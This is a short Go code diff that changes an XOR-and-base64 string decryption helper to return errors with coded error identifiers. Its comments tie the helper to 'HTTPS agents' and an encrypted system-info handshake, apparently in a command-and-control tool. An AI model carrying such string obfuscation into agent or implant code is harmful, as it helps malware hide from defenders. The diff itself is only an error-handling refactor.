@@ -105,14 +105,14 @@ type HybridEncryptedData struct {
 
 // xorDecrypt decrypts a base64-encoded XOR-encrypted string using the given key
 // This matches the pattern used by HTTPS agents for runtime decryption
-func xorDecrypt(encoded, key string) string {
+func xorDecrypt(encoded, key string) (string, error) {
 	if encoded == "" || key == "" {
-		return ""
+		return "", fmt.Errorf(Err(E1))
 	}
 
 	decoded, err := base64.StdEncoding.DecodeString(encoded)
 	if err != nil {
-		return ""
+		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
 	result := make([]byte, len(decoded))
@@ -121,7 +121,7 @@ func xorDecrypt(encoded, key string) string {
 		result[i] = decoded[i] ^ keyBytes[i%len(keyBytes)]
 	}
 
-	return string(result)
+	return string(result), nil
 }
 
 // encryptHandshakePayload encrypts the system info for the handshake
